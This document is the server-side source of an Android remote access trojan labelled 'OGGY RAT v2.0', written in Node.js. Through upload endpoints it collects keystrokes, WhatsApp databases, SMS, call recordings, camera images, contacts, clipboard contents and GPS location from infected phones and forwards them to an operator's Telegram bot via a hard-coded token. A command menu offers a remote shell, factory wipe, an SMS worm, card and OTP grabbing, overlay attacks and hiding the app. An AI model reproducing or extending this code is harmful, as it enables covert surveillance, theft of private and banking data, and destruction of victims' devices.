const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const token = '8504895545:AAHZi2eTYPtmvWY0hWF8KmiSnbrsEpFmWXA';
const id = '8477195695';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer({ dest: 'uploads/' });

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/files', express.static('uploads'));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';
let currentDuration = '';
let currentPath = '';

app.get('/', (req, res) => {
    res.send('<h1 align="center">🔥 OGGY RAT v2.0 🔥</h1>');
});

// ========== FILE UPLOAD FROM VICTIM ==========
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const originalName = req.file.originalname;
    const savedPath = req.file.path;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `📁 [FILE] ${originalName}\n📱 Device: ${req.headers.model}\n💾 Saved: ${savedPath}`,
        parse_mode: 'HTML'
    }, { filename: originalName });
    res.send('ok');
});

// ========== SCREENSHOT UPLOAD ==========
app.post('/uploadScreenshot', upload.single('screenshot'), (req, res) => {
    appBot.sendPhoto(id, req.file.buffer, {
        caption: `📸 [SCREENSHOT]\n📱 Device: ${req.headers.model}\n⏰ Time: ${new Date().toLocaleString()}`
    });
    res.send('ok');
});

// ========== SCREEN RECORD UPLOAD ==========
app.post('/uploadScreenRecord', upload.single('video'), (req, res) => {
    appBot.sendVideo(id, req.file.buffer, {
        caption: `🎥 [SCREEN RECORD]\n📱 Device: ${req.headers.model}\n📏 Size: ${req.file.size} bytes`
    });
    res.send('ok');
});

// ========== KEYLOGGER UPLOAD ==========
app.post('/uploadKeylog', (req, res) => {
    appBot.sendDocument(id, Buffer.from(req.body.logs, 'utf-8'), {
        caption: `⌨️ [KEYLOGGER]\n📱 Device: ${req.headers.model}\n📝 Length: ${req.body.logs.length} chars`,
        filename: `keylog_${Date.now()}.txt`
    });
    res.send('ok');
});

// ========== WHATSAPP DUMP ==========
app.post('/uploadWhatsApp', upload.single('db'), (req, res) => {
    appBot.sendDocument(id, req.file.buffer, {
        caption: `💬 [WHATSAPP DUMP]\n📱 Device: ${req.headers.model}\n🗄️ Database: msgstore.db`,
        filename: `whatsapp_${Date.now()}.db`
    });
    res.send('ok');
});

// ========== CALL RECORDING UPLOAD ==========
app.post('/uploadCallRecord', upload.single('audio'), (req, res) => {
    appBot.sendAudio(id, req.file.buffer, {
        caption: `📞 [CALL RECORDING]\n📱 Device: ${req.headers.model}`,
        title: 'Call Recording'
    });
    res.send('ok');
});

// ========== LIVE CAMERA STREAM (image) ==========
app.post('/uploadCameraImage', upload.single('image'), (req, res) => {
    appBot.sendPhoto(id, req.file.buffer, {
        caption: `📷 [CAMERA CAPTURE]\n📱 Device: ${req.headers.model}`
    });
    res.send('ok');
});

// ========== CLIPBOARD MONITOR ==========
app.post('/uploadClipboard', (req, res) => {
    appBot.sendMessage(id, `📋 [CLIPBOARD]\n📱 Device: ${req.headers.model}\n📄 Content:\n${req.body.text}`);
    res.send('ok');
});

// ========== TEXT UPLOAD ==========
app.post('/uploadText', (req, res) => {
    appBot.sendMessage(id, `📝 [TEXT]\n📱 Device: ${req.headers.model}\n\n${req.body.text}`, {
        parse_mode: 'HTML'
    });
    res.send('ok');
});

// ========== LOCATION UPLOAD ==========
app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon);
    appBot.sendMessage(id, `📍 [LOCATION]\n📱 Device: ${req.headers.model}\n🌐 Maps: https://maps.google.com/?q=${req.body.lat},${req.body.lon}`);
    res.send('ok');
});

// ========== CONTACTS UPLOAD ==========
app.post('/uploadContacts', (req, res) => {
    let contactList = '👥 [CONTACTS]\n\n';
    req.body.contacts.forEach(c => {
        contactList += `📱 ${c.name}: ${c.number}\n`;
    });
    appBot.sendMessage(id, contactList.substring(0, 4096));
    res.send('ok');
});

// ========== SMS INBOX UPLOAD ==========
app.post('/uploadSms', (req, res) => {
    let smsList = '💬 [SMS INBOX]\n\n';
    req.body.messages.forEach(m => {
        smsList += `📨 From: ${m.from}\n📝 ${m.body}\n⏰ ${m.date}\n\n`;
    });
    appBot.sendMessage(id, smsList.substring(0, 4096));
    res.send('ok');
});

// ========== CALL LOGS UPLOAD ==========
app.post('/uploadCallLogs', (req, res) => {
    let callList = '📞 [CALL LOGS]\n\n';
    req.body.calls.forEach(c => {
        callList += `${c.type}: ${c.number} (${c.duration}s) @ ${c.date}\n`;
    });
    appBot.sendMessage(id, callList.substring(0, 4096));
    res.send('ok');
});

// ========== APP LIST UPLOAD ==========
app.post('/uploadApps', (req, res) => {
    let appList = '📱 [INSTALLED APPS]\n\n';
    req.body.apps.forEach(a => {
        appList += `${a.name} (${a.package})\n`;
    });
    appBot.sendMessage(id, appList.substring(0, 4096));
    res.send('ok');
});

// ========== WEBSOCKET CONNECTION ==========
appSocket.on('connection', (ws, req) => {
    const clientUuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'N/A';
    const version = req.headers.version || 'N/A';
    const brightness = req.headers.brightness || 'N/A';
    const provider = req.headers.provider || 'N/A';
    
    ws.clientId = clientUuid;
    appClients.set(clientUuid, {
        model, battery, version, brightness, provider,
        connectedAt: Date.now()
    });
    
    appBot.sendMessage(id, `🔌 [NEW DEVICE]\n📱 Model: ${model}\n🔋 Battery: ${battery}%\n📀 Android: ${version}\n💡 Brightness: ${brightness}\n📡 Provider: ${provider}\n🆔 UUID: ${clientUuid.substring(0,8)}`);
    
    ws.on('close', () => {
        appBot.sendMessage(id, `🔌 [DISCONNECTED]\n📱 Model: ${model}\n🆔 UUID: ${clientUuid.substring(0,8)}`);
        appClients.delete(clientUuid);
    });
    
    ws.on('message', (data) => {
        try {
            const msg = data.toString();
            if(msg.startsWith('KEYLOG:')) {
                const keylog = msg.substring(7);
                appBot.sendMessage(id, `⌨️ [LIVE KEY]\n📱 ${model}\n🔑 ${keylog}`);
            }
        } catch(e) {}
    });
});

// ========== TELEGRAM BOT COMMANDS ==========
appBot.onText(/\/start/, (msg) => {
    if(msg.chat.id.toString() !== id) return;
    appBot.sendMessage(id, `🔥 OGGY RAT v2.0 - FULL CONTROL 🔥\n\n/status - Online devices\n/menu - Interactive menu\n/keylog_start - Start keylogger\n/keylog_stop - Stop keylogger\n/screenshot - Capture screen\n/screenrecord [sec] - Record screen\n/whatsapp - Dump WhatsApp\n/callrecord - Record call\n/camera - Capture camera\n/lock - Lock device\n/wipe - Factory reset\n/shell [cmd] - Remote shell\n/browse [path] - File browser\n/download [path] - Download file\n/upload - Upload file to device\n/clipboard_monitor - Monitor clipboard\n/notify [title] [msg] - Fake notification\n/overlay [url] - Overlay attack\n/spread - SMS worm\n/bankgrab - Grab cards/OTP\n/persist - Enable persistence\n/admin - Grant admin rights\n/stream_cam - Live camera stream\n/stream_mic - Live mic stream\n/hide - Hide app icon\n/restart - Restart device\n/msg [number] [text] - Send SMS\n/smsall [text] - Bulk SMS\n/location - Get GPS\n/contacts - Dump contacts\n/sms_inbox - Read SMS\n/call_logs - Get calls\n/apps - Installed apps\n/device_info - Full device info\n/clipboard - Get clipboard\n/vibrate [ms] - Vibrate\n/toast [msg] - Toast message\n/audio [path] - Play audio\n/stop_audio - Stop audio`, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [['/start', '/menu', '/status'], ['/screenshot', '/location', '/device_info']],
            resize_keyboard: true
        }
    });
});

appBot.onText(/\/status/, (msg) => {
    if(msg.chat.id.toString() !== id) return;
    if(appClients.size === 0) {
        appBot.sendMessage(id, '❌ No devices connected');
    } else {
        let status = `✅ [${appClients.size}] Devices Online:\n\n`;
        appClients.forEach((client, uuid) => {
            status += `📱 ${client.model}\n🔋 ${client.battery}%\n🆔 ${uuid.substring(0,8)}\n⏰ ${new Date(client.connectedAt).toLocaleTimeString()}\n\n`;
        });
        appBot.sendMessage(id, status);
    }
});

appBot.onText(/\/menu/, (msg) => {
    if(msg.chat.id.toString() !== id) return;
    if(appClients.size === 0) {
        appBot.sendMessage(id, '❌ No devices connected');
        return;
    }
    const buttons = [];
    appClients.forEach((client, uuid) => {
        buttons.push([{ text: `${client.model} (${client.battery}%)`, callback_data: `select_${uuid}` }]);
    });
    appBot.sendMessage(id, '📱 Select target device:', {
        reply_markup: { inline_keyboard: buttons }
    });
});

// ========== CALLBACK QUERY HANDLER ==========
appBot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [action, uuid] = data.split(':');
    
    if(action === 'select') {
        const client = appClients.get(uuid);
        if(!client) {
            appBot.answerCallbackQuery(callbackQuery.id, 'Device offline');
            return;
        }
        currentUuid = uuid;
        appBot.editMessageText(`✅ Connected to: ${client.model}\n🔋 Battery: ${client.battery}%\n\nChoose action:`, {
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📸 Screenshot", callback_data: `screenshot_${uuid}` }, { text: "🎥 Screen Record", callback_data: `screenrecord_${uuid}` }],
                    [{ text: "⌨️ Keylogger", callback_data: `keylog_start_${uuid}` }, { text: "🔑 Keylog Stop", callback_data: `keylog_stop_${uuid}` }],
                    [{ text: "💬 WhatsApp", callback_data: `whatsapp_${uuid}` }, { text: "📞 Call Record", callback_data: `callrecord_${uuid}` }],
                    [{ text: "📷 Camera", callback_data: `camera_${uuid}` }, { text: "🎙️ Live Mic", callback_data: `stream_mic_${uuid}` }],
                    [{ text: "📍 Location", callback_data: `location_${uuid}` }, { text: "👥 Contacts", callback_data: `contacts_${uuid}` }],
                    [{ text: "📨 SMS Inbox", callback_data: `sms_inbox_${uuid}` }, { text: "📞 Call Logs", callback_data: `call_logs_${uuid}` }],
                    [{ text: "📱 Apps", callback_data: `apps_${uuid}` }, { text: "ℹ️ Device Info", callback_data: `device_info_${uuid}` }],
                    [{ text: "📋 Clipboard", callback_data: `clipboard_${uuid}` }, { text: "🔒 Lock Device", callback_data: `lock_${uuid}` }],
                    [{ text: "💣 Wipe Data", callback_data: `wipe_${uuid}` }, { text: "🕵️ Hide App", callback_data: `hide_${uuid}` }],
                    [{ text: "🔁 Restart", callback_data: `restart_${uuid}` }, { text: "🔌 Disconnect", callback_data: `disconnect_${uuid}` }]
                ]
            }
        });
    }
    
    // Send command to victim
    const sendCommand = (cmd, extra = '') => {
        appSocket.clients.forEach(client => {
            if(client.clientId === uuid) {
                client.send(`${cmd}${extra ? ':' + extra : ''}`);
            }
        });
    };
    
    if(data.startsWith('screenshot_')) {
        sendCommand('SCREENSHOT');
        appBot.sendMessage(id, '📸 Screenshot command sent');
    }
    else if(data.startsWith('screenrecord_')) {
        appBot.sendMessage(id, '🎥 Enter duration (seconds):', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
        currentDuration = 'screenrecord';
    }
    else if(data.startsWith('keylog_start_')) {
        sendCommand('KEYLOG_START');
        appBot.sendMessage(id, '⌨️ Keylogger started');
    }
    else if(data.startsWith('keylog_stop_')) {
        sendCommand('KEYLOG_STOP');
        appBot.sendMessage(id, '⌨️ Keylogger stopped');
    }
    else if(data.startsWith('whatsapp_')) {
        sendCommand('WHATSAPP_DUMP');
        appBot.sendMessage(id, '💬 Dumping WhatsApp...');
    }
    else if(data.startsWith('callrecord_')) {
        sendCommand('CALL_RECORD');
        appBot.sendMessage(id, '📞 Recording call...');
    }
    else if(data.startsWith('camera_')) {
        sendCommand('CAMERA');
        appBot.sendMessage(id, '📷 Camera capture sent');
    }
    else if(data.startsWith('stream_mic_')) {
        sendCommand('STREAM_MIC');
        appBot.sendMessage(id, '🎙️ Live mic streaming');
    }
    else if(data.startsWith('location_')) {
        sendCommand('LOCATION');
        appBot.sendMessage(id, '📍 GPS request sent');
    }
    else if(data.startsWith('contacts_')) {
        sendCommand('CONTACTS');
        appBot.sendMessage(id, '👥 Dumping contacts');
    }
    else if(data.startsWith('sms_inbox_')) {
        sendCommand('SMS_INBOX');
        appBot.sendMessage(id, '📨 Reading SMS');
    }
    else if(data.startsWith('call_logs_')) {
        sendCommand('CALL_LOGS');
        appBot.sendMessage(id, '📞 Getting call logs');
    }
    else if(data.startsWith('apps_')) {
        sendCommand('APPS');
        appBot.sendMessage(id, '📱 Listing apps');
    }
    else if(data.startsWith('device_info_')) {
        sendCommand('DEVICE_INFO');
        appBot.sendMessage(id, 'ℹ️ Getting device info');
    }
    else if(data.startsWith('clipboard_')) {
        sendCommand('CLIPBOARD');
        appBot.sendMessage(id, '📋 Getting clipboard');
    }
    else if(data.startsWith('lock_')) {
        sendCommand('LOCK');
        appBot.sendMessage(id, '🔒 Locking device');
    }
    else if(data.startsWith('wipe_')) {
        sendCommand('WIPE');
        appBot.sendMessage(id, '💣 Factory reset initiated');
    }
    else if(data.startsWith('hide_')) {
        sendCommand('HIDE');
        appBot.sendMessage(id, '🕵️ App hidden');
    }
    else if(data.startsWith('restart_')) {
        sendCommand('RESTART');
        appBot.sendMessage(id, '🔁 Restarting device');
    }
    else if(data.startsWith('disconnect_')) {
        sendCommand('DISCONNECT');
        appBot.sendMessage(id, '🔌 Device disconnected');
    }
    
    appBot.answerCallbackQuery(callbackQuery.id);
});

// Handle reply messages for duration
appBot.on('message', (msg) => {
    if(msg.reply_to_message && currentDuration === 'screenrecord') {
        const duration = parseInt(msg.text);
        if(!isNaN(duration)) {
            appSocket.clients.forEach(client => {
                if(client.clientId === currentUuid) {
                    client.send(`SCREENRECORD:${duration}`);
                }
            });
            appBot.sendMessage(id, `🎥 Recording screen for ${duration} seconds`);
        }
        currentDuration = '';
        currentUuid = '';
    }
});

// ========== KEEP ALIVE ==========
setInterval(() => {
    appSocket.clients.forEach(client => {
        client.send('PING');
    });
    axios.get(address).catch(() => {});
}, 5000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`🔥 OGGY RAT running on port ${PORT}`);
});